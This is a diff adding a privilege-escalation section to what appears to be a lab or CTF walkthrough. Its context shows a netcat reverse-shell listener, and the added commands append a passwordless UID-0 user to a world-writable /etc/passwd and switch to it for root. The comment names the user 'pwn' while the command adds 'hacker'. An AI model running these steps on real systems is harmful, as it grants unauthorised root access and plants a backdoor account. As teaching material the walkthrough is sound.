@@ -119,3 +119,29 @@ PORT -> listener of port
 Listener:
 
 ```nc -lnvp 4444```
+At this point you have a shell as zwique
+
+# Privilege Escalation via `/etc/passwd`
+
+### Why this works
+/etc/passwd is world-writable (misconfigured permissions: chmod 666).
+The x in the password field of an entry tells the system to look up the
+password hash in /etc/shadow. If you remove the x, the system treats
+the password as empty — no password required to authenticate
+
+```
+ls -la /etc/passwd
+# -rw-rw-rw- 1 root root ... /etc/passwd
+```
+
+##  Inject a new passwordless root-level user
+
+```
+# Add a new user 'pwn' with UID 0 and no password
+echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
+
+su hacker
+# Press Enter when prompted for password
+
+whoami  # → root
+```
